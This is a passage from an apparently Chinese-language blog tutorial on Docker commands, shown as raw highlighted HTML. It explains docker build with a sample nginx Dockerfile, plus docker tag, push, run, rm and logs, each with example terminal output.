class="hljs-string">&quot;AttachStdin&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;AttachStdout&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;AttachStderr&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;ExposedPorts&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;80/tcp&quot;</span>: &#123;&#125;<br>            &#125;,<br>            <span class="hljs-string">&quot;Tty&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;OpenStdin&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;StdinOnce&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;Env&quot;</span>: [<br>                <span class="hljs-string">&quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;</span>,<br>                <span class="hljs-string">&quot;NGINX_VERSION=1.21.5&quot;</span>,<br>                <span class="hljs-string">&quot;NJS_VERSION=0.7.1&quot;</span>,<br>                <span class="hljs-string">&quot;PKG_RELEASE=1~bullseye&quot;</span><br>            ],<br>            <span class="hljs-string">&quot;Cmd&quot;</span>: [<br>                <span class="hljs-string">&quot;nginx&quot;</span>,<br>                <span class="hljs-string">&quot;-g&quot;</span>,<br>                <span class="hljs-string">&quot;daemon off;&quot;</span><br>            ],<br>            <span class="hljs-string">&quot;Image&quot;</span>: <span class="hljs-string">&quot;sha256:86f0ad4f760522a77d5d2748709f102fba21b448831ba769d6b5bee6bc8b15e7&quot;</span>,<br>            <span class="hljs-string">&quot;Volumes&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;WorkingDir&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;Entrypoint&quot;</span>: [<br>                <span class="hljs-string">&quot;/docker-entrypoint.sh&quot;</span><br>            ],<br>            <span class="hljs-string">&quot;OnBuild&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;Labels&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;maintainer&quot;</span>: <span class="hljs-string">&quot;NGINX Docker Maintainers &lt;docker-maint@nginx.com&gt;&quot;</span><br>            &#125;,<br>            <span class="hljs-string">&quot;StopSignal&quot;</span>: <span class="hljs-string">&quot;SIGQUIT&quot;</span><br>        &#125;,<br>        <span class="hljs-string">&quot;Architecture&quot;</span>: <span class="hljs-string">&quot;arm64&quot;</span>,<br>        <span class="hljs-string">&quot;Variant&quot;</span>: <span class="hljs-string">&quot;v8&quot;</span>,<br>        <span class="hljs-string">&quot;Os&quot;</span>: <span class="hljs-string">&quot;linux&quot;</span>,<br>        <span class="hljs-string">&quot;Size&quot;</span>: <span class="hljs-number">134458357</span>,<br>        <span class="hljs-string">&quot;VirtualSize&quot;</span>: <span class="hljs-number">134458357</span>,<br>        <span class="hljs-string">&quot;GraphDriver&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;Data&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;LowerDir&quot;</span>: <span class="hljs-string">&quot;/var/lib/docker/overlay2/19bce005f2b1d9db0eba7c613875f51cd1b7a19ea0a43dcbf45c1017fbcc03dc/diff:/var/lib/docker/overlay2/2949cec29c3a2dfba7a1cbc215919f6ec18a27e80506dbbc51017f4389bb604e/diff:/var/lib/docker/overlay2/8f23aefbf0d9446e0dd6f9d228bdd2ed21b4b556d064352cdb546407fbe22b7b/diff:/var/lib/docker/overlay2/aba312ecee136814284e1d21b2d4f6c28cdabb85ee4d3142324ae752156359ac/diff:/var/lib/docker/overlay2/3db4264e94b91b2dac969fd2a0af7317aeb303e8d0032162e2e4734c05b750c9/diff&quot;</span>,<br>                <span class="hljs-string">&quot;MergedDir&quot;</span>: <span class="hljs-string">&quot;/var/lib/docker/overlay2/13e56f4f1a8dc5bf18857bdf279ce0d20b730534c8b5027eafe142cf28e36a95/merged&quot;</span>,<br>                <span class="hljs-string">&quot;UpperDir&quot;</span>: <span class="hljs-string">&quot;/var/lib/docker/overlay2/13e56f4f1a8dc5bf18857bdf279ce0d20b730534c8b5027eafe142cf28e36a95/diff&quot;</span>,<br>                <span class="hljs-string">&quot;WorkDir&quot;</span>: <span class="hljs-string">&quot;/var/lib/docker/overlay2/13e56f4f1a8dc5bf18857bdf279ce0d20b730534c8b5027eafe142cf28e36a95/work&quot;</span><br>            &#125;,<br>            <span class="hljs-string">&quot;Name&quot;</span>: <span class="hljs-string">&quot;overlay2&quot;</span><br>        &#125;,<br>        <span class="hljs-string">&quot;RootFS&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;Type&quot;</span>: <span class="hljs-string">&quot;layers&quot;</span>,<br>            <span class="hljs-string">&quot;Layers&quot;</span>: [<br>                <span class="hljs-string">&quot;sha256:1c79be3b9cebb9838b5c607567cb18eb50cd94e39b20a6241ca7d2d53dcffc89&quot;</span>,<br>                <span class="hljs-string">&quot;sha256:c6652321c7b9deb69994b5490710e7ab52a38f5171eddbe6f4d47fb9ea928929&quot;</span>,<br>                <span class="hljs-string">&quot;sha256:d00df4ca0725daf0ad547fcc9c731ed877d7b898559703ffe94e35de77ebd455&quot;</span>,<br>                <span class="hljs-string">&quot;sha256:eb5d612bd5e0648b5dd9680101b778787652f435ac73db4b5e559b868392a314&quot;</span>,<br>                <span class="hljs-string">&quot;sha256:01792ec538b3b8d67d341ad7b079beec9b289feb8a1e618b3fcfe2bb0c206a2b&quot;</span>,<br>                <span class="hljs-string">&quot;sha256:7bc89178e1bbe5212cc907f798b0f3bb3e07c71083390703e04486012d398a4f&quot;</span><br>            ]<br>        &#125;,<br>        <span class="hljs-string">&quot;Metadata&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;LastTagTime&quot;</span>: <span class="hljs-string">&quot;0001-01-01T00:00:00Z&quot;</span><br>        &#125;<br>    &#125;<br>]<br></code></pre></td></tr></table></figure><h2 id="生成镜像"><a href="#生成镜像" class="headerlink" title="生成镜像"></a>生成镜像</h2><h3 id="docker-build"><a href="#docker-build" class="headerlink" title="docker build"></a>docker build</h3><p><strong>docker build [OPTIONS] PATH | URL | -</strong></p><h4 id="描述-6"><a href="#描述-6" class="headerlink" title="描述"></a>描述</h4><p>已有的镜像不能满足业务需求，需要自己构建符合需求的镜像</p><h4 id="OPTIONS-4"><a href="#OPTIONS-4" class="headerlink" title="OPTIONS"></a>OPTIONS</h4><h5 id="t"><a href="#t" class="headerlink" title="-t"></a>-t</h5><p>–tag list</p><p>–target string  指定镜像 tag</p><h4 id="PATH"><a href="#PATH" class="headerlink" title="PATH"></a>PATH</h4><p>指定 Dockerfile 路径</p><h4 id="实例-5"><a href="#实例-5" class="headerlink" title="实例"></a>实例</h4><h5 id="编写-Dockerfile-文件"><a href="#编写-Dockerfile-文件" class="headerlink" title="编写 Dockerfile 文件"></a>编写 Dockerfile 文件</h5><p>注意：文件名就是Dockerfile</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">➜  test cat Dockerfile <br><span class="hljs-comment"># 使用官方的 Ubuntu 20.04 镜像作为基础</span><br><span class="hljs-keyword">FROM</span> ubuntu:<span class="hljs-number">20.04</span><br><br><span class="hljs-comment"># 作者信息</span><br><span class="hljs-keyword">LABEL</span><span class="language-bash"> maintainer=<span class="hljs-string">&quot;your-email@example.com&quot;</span></span><br><br><span class="hljs-comment"># 更新 apt 软件包列表并安装一个示例应用程序</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> apt-get update &amp;&amp; apt-get install -y \</span><br><span class="language-bash">    nginx \</span><br><span class="language-bash">    &amp;&amp; <span class="hljs-built_in">rm</span> -rf /var/lib/apt/lists/*</span><br><br><span class="hljs-comment"># 将本地文件复制到镜像中</span><br><span class="hljs-keyword">COPY</span><span class="language-bash"> index.html /var/www/html/</span><br><br><span class="hljs-comment"># 暴露端口</span><br><span class="hljs-keyword">EXPOSE</span> <span class="hljs-number">80</span><br><br><span class="hljs-comment"># 定义容器启动时运行的命令</span><br><span class="hljs-keyword">CMD</span><span class="language-bash"> [<span class="hljs-string">&quot;nginx&quot;</span>, <span class="hljs-string">&quot;-g&quot;</span>, <span class="hljs-string">&quot;daemon off;&quot;</span>]</span><br></code></pre></td></tr></table></figure><h5 id="build镜像"><a href="#build镜像" class="headerlink" title="build镜像"></a>build镜像</h5><p>docker build -t my-nginx-image .</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs ruby">➜  test docker build -t my-nginx-image .<br>[+] <span class="hljs-title class_">Building</span> <span class="hljs-number">74</span>.9s (<span class="hljs-number">8</span>/<span class="hljs-number">8</span>) <span class="hljs-variable constant_">FINISHED</span>                                                                                                                                           <br> =&gt; [internal] load build definition from <span class="hljs-title class_">Dockerfile</span>                                                                                                                   <span class="hljs-number">0</span>.0s<br> =&gt; =&gt; transferring <span class="hljs-symbol">dockerfile:</span> 491B                                                                                                                                   <span class="hljs-number">0</span>.0s<br> =&gt; [internal] load .dockerignore                                                                                                                                      <span class="hljs-number">0</span>.0s<br> =&gt; =&gt; transferring <span class="hljs-symbol">context:</span> 2B                                                                                                                                        <span class="hljs-number">0</span>.0s<br> =&gt; [internal] load metadata for docker.io/library/<span class="hljs-symbol">ubuntu:</span><span class="hljs-number">20.04</span>                                                                                                        <span class="hljs-number">1</span>.4s<br> =&gt; [<span class="hljs-number">1</span>/<span class="hljs-number">3</span>] <span class="hljs-variable constant_">FROM</span> docker.io/library/<span class="hljs-symbol">ubuntu:</span><span class="hljs-number">20.04</span><span class="hljs-variable">@sha256</span><span class="hljs-symbol">:</span>626ffe58f6e7566e00254b638eb7e0f3b11d4da9675088f4781a50ae288f3322                                                 <span class="hljs-number">23</span>.4s<br> =&gt; =&gt; resolve docker.io/library/<span class="hljs-symbol">ubuntu:</span><span class="hljs-number">20.04</span><span class="hljs-variable">@sha256</span><span class="hljs-symbol">:</span>626ffe58f6e7566e00254b638eb7e0f3b11d4da9675088f4781a50ae288f3322                                                  <span class="hljs-number">0</span>.0s<br> =&gt; =&gt; <span class="hljs-symbol">sha256:</span>626ffe58f6e7566e00254b638eb7e0f3b11d4da9675088f4781a50ae288f3322 <span class="hljs-number">1</span>.42kB / <span class="hljs-number">1</span>.42kB                                                                         <span class="hljs-number">0</span>.0s<br> =&gt; =&gt; <span class="hljs-symbol">sha256:</span>26c3bd3ae441c873a210200bcbb975ffd2bbf0c0841a4584f4476c8a5b8f3d99 529B / 529B                                                                             <span class="hljs-number">0</span>.0s<br> =&gt; =&gt; <span class="hljs-symbol">sha256:</span>d5ca7a4456053674d490803005766890dd19e3f7e789a48737c0d462da531f5d <span class="hljs-number">1</span>.48kB / <span class="hljs-number">1</span>.48kB                                                                         <span class="hljs-number">0</span>.0s<br> =&gt; =&gt; <span class="hljs-symbol">sha256:</span>a39c84e173f038958d338f55a9e8ee64bb6643e8ac6ae98e08ca65146e668d86 <span class="hljs-number">27</span>.17MB / <span class="hljs-number">27</span>.17MB                                                                      <span class="hljs-number">22</span>.6s<br> =&gt; =&gt; extracting <span class="hljs-symbol">sha256:</span>a39c84e173f038958d338f55a9e8ee64bb6643e8ac6ae98e08ca65146e668d86                                                                              <span class="hljs-number">0</span>.7s<br> =&gt; [internal] load build context                                                                                                                                      <span class="hljs-number">0</span>.0s<br> =&gt; =&gt; transferring <span class="hljs-symbol">context:</span> 255B                                                                                                                                      <span class="hljs-number">0</span>.0s<br> =&gt; [<span class="hljs-number">2</span>/<span class="hljs-number">3</span>] <span class="hljs-variable constant_">RUN</span> apt-get update &amp;&amp; apt-get install -y     nginx     &amp;&amp; rm -rf /var/lib/apt/lists/*                                                                       <span class="hljs-number">49</span>.7s<br> =&gt; [<span class="hljs-number">3</span>/<span class="hljs-number">3</span>] <span class="hljs-variable constant_">COPY</span> index.html /var/www/html/                                                                                                                               <span class="hljs-number">0</span>.0s <br> =&gt; exporting to image                                                                                                                                                 <span class="hljs-number">0</span>.2s <br> =&gt; =&gt; exporting layers                                                                                                                                                <span class="hljs-number">0</span>.2s <br> =&gt; =&gt; writing image <span class="hljs-symbol">sha256:</span>fd09b8e38b0e75b933c83996e55146d4a59e2c62b13c0daec733177186923b39                                                                           <span class="hljs-number">0</span>.0s <br> =&gt; =&gt; naming to docker.io/library/my-nginx-image  <br></code></pre></td></tr></table></figure><h2 id="添加TAG"><a href="#添加TAG" class="headerlink" title="添加TAG"></a>添加TAG</h2><h3 id="docker-tag"><a href="#docker-tag" class="headerlink" title="docker tag"></a>docker tag</h3><p><strong>docker tag 镜像名称:镜像版本 镜像新名称:镜像新版本</strong></p><h4 id="描述-7"><a href="#描述-7" class="headerlink" title="描述"></a>描述</h4><p>为镜像设置tag</p><h4 id="OPTIONS-5"><a href="#OPTIONS-5" class="headerlink" title="OPTIONS"></a>OPTIONS</h4><h4 id="实例-6"><a href="#实例-6" class="headerlink" title="实例"></a>实例</h4><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">[root@iZbp1191gh7vw52537lyxrZ ~]<span class="hljs-comment"># docker images</span><br>REPOSITORY        <span class="hljs-keyword">TAG</span>       <span class="hljs-title">IMAGE</span> ID       CREATED        SIZE<br>grafana/grafana   <span class="hljs-number">8.2</span>.<span class="hljs-number">6</span>     aeeaa96eea83   <span class="hljs-number">9</span> months ago   <span class="hljs-number">253M</span>B<br>grafana/grafana   <span class="hljs-number">6.3</span>.<span class="hljs-number">3</span>     a6e14b4109af   <span class="hljs-number">3</span> years ago    <span class="hljs-number">253M</span>B<br>[root@iZbp1191gh7vw52537lyxrZ ~]<span class="hljs-comment"># docker tag grafana/grafana:8.2.6 grafana:8.2.6.1</span><br>[root@iZbp1191gh7vw52537lyxrZ ~]<span class="hljs-comment"># docker images</span><br>REPOSITORY        <span class="hljs-keyword">TAG</span>       <span class="hljs-title">IMAGE</span> ID       CREATED        SIZE<br>grafana/grafana   <span class="hljs-number">8.2</span>.<span class="hljs-number">6</span>     aeeaa96eea83   <span class="hljs-number">9</span> months ago   <span class="hljs-number">253M</span>B<br>grafana           <span class="hljs-number">8.2</span>.<span class="hljs-number">6.1</span>   aeeaa96eea83   <span class="hljs-number">9</span> months ago   <span class="hljs-number">253M</span>B<br>grafana/grafana   <span class="hljs-number">6.3</span>.<span class="hljs-number">3</span>     a6e14b4109af   <span class="hljs-number">3</span> years ago    <span class="hljs-number">253M</span>B<br></code></pre></td></tr></table></figure><h2 id="上传镜像"><a href="#上传镜像" class="headerlink" title="上传镜像"></a>上传镜像</h2><h3 id="docker-push"><a href="#docker-push" class="headerlink" title="docker push"></a><strong>docker push</strong></h3><p><strong>docker push [OPTIONS] NAME[:TAG]</strong></p><h4 id="描述-8"><a href="#描述-8" class="headerlink" title="描述"></a>描述</h4><p>上传镜像到远程镜像仓库</p><h4 id="OPTIONS-6"><a href="#OPTIONS-6" class="headerlink" title="OPTIONS"></a>OPTIONS</h4><h5 id="a"><a href="#a" class="headerlink" title="-a"></a>-a</h5><p>–all-tags 上传所有tag的镜像到仓库</p><p>–disable-content-trust  关闭镜像签名校验，默认校验</p><p>-q</p><p>–quiet Suppress verbose output</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs stylus">➜  / docker push registry<span class="hljs-selector-class">.xxx</span><span class="hljs-selector-class">.xxx</span><span class="hljs-selector-class">.xxx</span>.xxx/hours/my-nginx-<span class="hljs-selector-tag">image</span>:<span class="hljs-number">2.0</span>                                    <br>The push refers to repository <span class="hljs-selector-attr">[registry.xxx.xxx.xxx.xxx/hours/my-nginx-image]</span><br><span class="hljs-number">0</span>c192a2bcb80: Pushed <br>bed1f48a7b1b: Pushed <br><span class="hljs-number">350</span>f36b271de: Layer already exists <br><span class="hljs-number">2.0</span>: digest: sha256:c0b08d64470340b8fc730b795e0d99f78da1595d5443ab97e7b51ab8bd057022 size: <span class="hljs-number">948</span><br>➜  / docker push registry<span class="hljs-selector-class">.xxx</span><span class="hljs-selector-class">.xxx</span><span class="hljs-selector-class">.xxx</span>.xxx/hours/my-nginx-<span class="hljs-selector-tag">image</span>:<span class="hljs-number">2.0</span> -<span class="hljs-selector-tag">q</span><br>registry<span class="hljs-selector-class">.xxx</span><span class="hljs-selector-class">.xxx</span><span class="hljs-selector-class">.xxx</span>.xxx/hours/my-nginx-<span class="hljs-selector-tag">image</span>:<span class="hljs-number">2.0</span><br></code></pre></td></tr></table></figure><h5 id="NAME-TAG"><a href="#NAME-TAG" class="headerlink" title="NAME[:TAG]"></a>NAME[:TAG]</h5><p>指定需要上传的镜像名或指定镜像TAG</p><p>不指定TAG，则使用默认TAG：latest</p><h5 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h5><h6 id="不指定镜像仓库"><a href="#不指定镜像仓库" class="headerlink" title="不指定镜像仓库"></a>不指定镜像仓库</h6><p>默认会上传到 docker.io</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs vbnet">➜  / docker push my-nginx-image<br><span class="hljs-keyword">Using</span> <span class="hljs-keyword">default</span> tag: latest<br>The push refers <span class="hljs-keyword">to</span> repository [docker.io/library/my-nginx-image]<br><span class="hljs-number">0</span>c192a2bcb80: Preparing <br><span class="hljs-symbol">bed1f48a7b1b:</span> Preparing <br><span class="hljs-number">350</span>f36b271de: Preparing <br><span class="hljs-symbol">denied:</span> requested access <span class="hljs-keyword">to</span> the resource <span class="hljs-built_in">is</span> denied<br></code></pre></td></tr></table></figure><h6 id="指定镜像仓库"><a href="#指定镜像仓库" class="headerlink" title="指定镜像仓库"></a>指定镜像仓库</h6><p>仓库域名&#x2F;项目名&#x2F;镜像名[:tag]</p><p>registry.xxx.xxx.xxx.xxx&#x2F;waf&#x2F;my-nginx-image:latest</p><h5 id="实例-7"><a href="#实例-7" class="headerlink" title="实例"></a>实例</h5><p>1、镜像添加tag</p><p>docker tag 镜像名:tag 仓库域名&#x2F;项目名&#x2F;镜像名:tag</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs perl">➜  / docker tag <span class="hljs-keyword">my</span>-nginx-image:latest registry.xxx.xxx.xxx.xxx/hours/<span class="hljs-keyword">my</span>-nginx-image:<span class="hljs-number">2.0</span><br><br>➜  / docker images | <span class="hljs-keyword">grep</span> <span class="hljs-number">2.0</span>     <br>registry.xxx.xxx.xxx.xxx/hours/<span class="hljs-keyword">my</span>-nginx-image     <span class="hljs-number">2.0</span>          fd09b8e38b0e   <span class="hljs-number">5</span> days ago      123MB<br></code></pre></td></tr></table></figure><p>2、上传镜像</p><p>可能需要登录，如果没有登录会提示（unauthorized: unauthorized to access repository: waf&#x2F;my-nginx-image, action: push: unauthorized to access repository: waf&#x2F;my-nginx-image, action: push）</p><p>docker push 仓库域名&#x2F;项目名&#x2F;镜像名:tag</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs nix">➜  <span class="hljs-symbol">/</span> docker push registry.xxx.xxx.xxx.xxx<span class="hljs-operator">/</span>hours<span class="hljs-operator">/</span>my-nginx-image:<span class="hljs-number">2.0</span>                                    <br>The push refers to repository [registry.xxx.xxx.xxx.xxx<span class="hljs-operator">/</span>hours<span class="hljs-operator">/</span>my-nginx-image]<br><span class="hljs-number">0</span><span class="hljs-params">c192a2bcb80:</span> Pushed <br><span class="hljs-params">bed1f48a7b1b:</span> Pushed <br><span class="hljs-number">350</span><span class="hljs-params">f36b271de:</span> Layer already exists <br><span class="hljs-number">2.0</span>: <span class="hljs-params">digest:</span> sha256:c0b08d64470340b8fc730b795e0d99f78da1595d5443ab97e7b51ab8bd057022 <span class="hljs-params">size:</span> <span class="hljs-number">948</span><br></code></pre></td></tr></table></figure><h1 id="容器"><a href="#容器" class="headerlink" title="容器"></a>容器</h1><h2 id="创建容器"><a href="#创建容器" class="headerlink" title="创建容器"></a>创建容器</h2><h3 id="docker-run"><a href="#docker-run" class="headerlink" title="docker run"></a>docker run</h3><p><strong>docker run [OPTIONS] IMAGE [COMMAND] [ARG…]</strong></p><p>docker run -itd  -p port1:port2 -v &#x2F;path:&#x2F;path IMAGE</p><p>dockerdocker二进制文件</p><p>run运行docker容器命令</p><h4 id="描述-9"><a href="#描述-9" class="headerlink" title="描述"></a>描述</h4><p>创建并运行容器</p><h4 id="OPTIONS-7"><a href="#OPTIONS-7" class="headerlink" title="OPTIONS"></a>OPTIONS</h4><h5 id="–name-Name"><a href="#–name-Name" class="headerlink" title="–name  Name"></a>–name  Name</h5><p>设置容器名称</p><h5 id="i，–interactive"><a href="#i，–interactive" class="headerlink" title="-i，–interactive"></a>-i，–interactive</h5><p>Keep STDIN open even if not attached  为容器创建终端，即使没有连接</p><h5 id="t，–tty"><a href="#t，–tty" class="headerlink" title="-t，–tty"></a>-t，–tty</h5><p>Allocate a pseudo-TTY 为容器分配伪终端，允许你对容器内的标准输入进行交互</p><h5 id="d，–detch"><a href="#d，–detch" class="headerlink" title="-d，–detch"></a>-d，–detch</h5><p>Run container in background and print container ID  创建的容器运行在后台，输出容器id</p><h5 id="–rm"><a href="#–rm" class="headerlink" title="–rm"></a>–rm</h5><p>容器退出时自动清理容器内部的文件系统，不可与 -d 命令同时使用</p><p>只能自动清理 foreground 容器，不可自动清理 detached 容器，也会清理容器的匿名 data volumes</p><p>等价于容器退出后，执行 docker rm -v</p><h5 id="port1"><a href="#port1" class="headerlink" title="port1"></a>port1</h5><p>容器外端口，宿主机端口</p><h5 id="port2"><a href="#port2" class="headerlink" title="port2"></a>port2</h5><p>容器内端口</p><h5 id="IMAGE"><a href="#IMAGE" class="headerlink" title="IMAGE"></a>IMAGE</h5><p>镜像名</p><h5 id="v-path1-path2"><a href="#v-path1-path2" class="headerlink" title="-v &#x2F;path1:&#x2F;path2"></a>-v &#x2F;path1:&#x2F;path2</h5><p>挂载目录  &#x2F;path1 宿主机目录  &#x2F;path2 容器目录，也就是将宿主机挂载到容器中</p><h4 id="COMMAND"><a href="#COMMAND" class="headerlink" title="COMMAND"></a>COMMAND</h4><p>制定执行的命令，例如 &#x2F;bin&#x2F;bash 指定使用的bash</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs vim">➜  docker run -itd -<span class="hljs-keyword">p</span> <span class="hljs-number">8888</span>:<span class="hljs-number">80</span> -v /Users/admin/<span class="hljs-keyword">opt</span>/docker/:/<span class="hljs-keyword">opt</span>/ cento<span class="hljs-variable">s:7</span><br>Unable <span class="hljs-keyword">to</span> <span class="hljs-keyword">find</span> image <span class="hljs-string">&#x27;centos:7&#x27;</span> locally<br><span class="hljs-number">7</span>: Pulling from library/centos<br><span class="hljs-number">6717</span>b8ec66cd: Pull <span class="hljs-built_in">complete</span> <br>Digest: <span class="hljs-built_in">sha256</span>:c73f515d06b0fa07bb18d8202035e739a494ce760aa73129f60f4bf2bd22b407<br>Status: Downloaded newer image <span class="hljs-keyword">for</span> cento<span class="hljs-variable">s:7</span><br><span class="hljs-number">0</span>fc471d9378c722e269c16673297223a77f1ba482bd67f0a4ad5f904bc9bd93f<br>➜  docker docker <span class="hljs-keyword">ps</span><br>CONTAINER ID   IMAGE      COMMAND       CREATED         STATUS         PORTS                  NAMES<br><span class="hljs-number">0</span>fc471d9378c   cento<span class="hljs-variable">s:7</span>   <span class="hljs-string">&quot;/bin/bash&quot;</span>   <span class="hljs-number">5</span> seconds ago   Up <span class="hljs-number">5</span> seconds   <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">8888</span>-&gt;<span class="hljs-number">80</span>/tcp   gifted_banach<br></code></pre></td></tr></table></figure><h2 id="删除容器"><a href="#删除容器" class="headerlink" title="删除容器"></a>删除容器</h2><h3 id="docker-rm"><a href="#docker-rm" class="headerlink" title="docker rm"></a>docker rm</h3><p>docker rm id</p><h4 id="描述-10"><a href="#描述-10" class="headerlink" title="描述"></a>描述</h4><p>删除指定容器</p><h4 id="实例-8"><a href="#实例-8" class="headerlink" title="实例"></a>实例</h4><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir">(base) root<span class="hljs-variable">@localhost</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># docker rm dbea3aafd585</span><br>dbea3aafd585<br></code></pre></td></tr></table></figure><h2 id="查看容器日志"><a href="#查看容器日志" class="headerlink" title="查看容器日志"></a>查看容器日志</h2><p><strong>docker logs [-f] id</strong></p><h3 id="docker-logs"><a href="#docker-logs" class="headerlink" title="docker logs"></a>docker logs</h3><h4 id="描述-11"><a href="#描述-11" class="headerlink" title="描述"></a>描述</h4><p>查看容器的日志信息</p><h4 id="OPTIONS-8"><a href="#OPTIONS-8" class="headerlink" title="OPTIONS"></a>OPTIONS</h4><h5 id="f-1"><a href="#f-1" class="headerlink" title="-f"></a>-f</h5><p>查看实时日志</p><h4 id="实例-9"><a href="#实例-9" class="headerlink" title="实例"></a>实例</h4><p>查看实时日志</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs css">➜  /tmp docker logs -f <span class="hljs-number">61804</span>e0083af<br>┌──(root㉿<span class="hljs-number">61804</span>e0083af)-<span class="hljs-selector-attr">[/]</span><br>└─# ┌──(root㉿<span class="hljs-number">61804</span>e0083af)-<span class="hljs-selector-attr">[/]</span><br>└─# ┌──(root㉿<span class="hljs-number">61804</span>e0083af)-<span class="hljs-selector-attr">[/]</span><br>└─# ┌──(root㉿<span class="hljs-number">61804</span>e0083af)-<span class="hljs-selector-attr">[/]</span><br>┌──(root㉿<span class="hljs-number">61804</span>e0083af)-<span class="hljs-selector-attr">[/]</span><br>┌──(root㉿<span class="hljs-number">61804</span>e0083af)-<span class="hljs-selector-attr">[/]</span><br>┌──(root㉿<span class="hljs-number">61804</span>e0083af)-<span class="hljs-selector-attr">[/]</span><br>┌──(root㉿<span class="hljs-number">61804</span>e0083af)-<span class="hljs-selector-attr">[/]</span><br>└─# ┌──(root㉿<span class="hljs-number">61804</span>e0083af)-<span class="hljs-selector-attr">[/]</span><br>└─# ┌──(root㉿<span class="hljs-number">61804</span>e0083af)-<span class="hljs-selector-attr">[/]</span><br>└─# ┌──(root㉿<span class="hljs-number">61804</span>e0083af)-<span class="hljs-selector-attr">[/]</span><br>└─# ┌──(root㉿<span class="hljs-number">61804</span>e0083af)-<span class="hljs-selector-attr">[/]</span><br>└─# ┌──(root㉿<span class="hljs-number">61804</span>e0083af)-<span class="hljs-selector-attr">[/]</span><br>└─# ┌──(root㉿<span class="hljs-number">61804</span>e0083af)-<span class="hljs-selector-attr">[/]</span><br>└─# ┌──(root㉿<span class="hljs-number">61804</span>e0083af)-<span class="hljs-selector-attr">[/]</span><br>└─# ┌──(root㉿<span class="hljs-number">61804</span>e0083af)-<span class="hljs-selector-attr">[/]</span><br>└─# ┌──(root㉿<span class="hljs-number">61804</span>e0083af)-<span class="hljs-selector-attr">[/]</span><br>┌──(root㉿<span class="hljs-number">61804</span>e0083af)-<span class="hljs-selector-attr">[/]</span><br>┌──(root㉿<span class="hljs-number">61804</span>e0083af)-<span 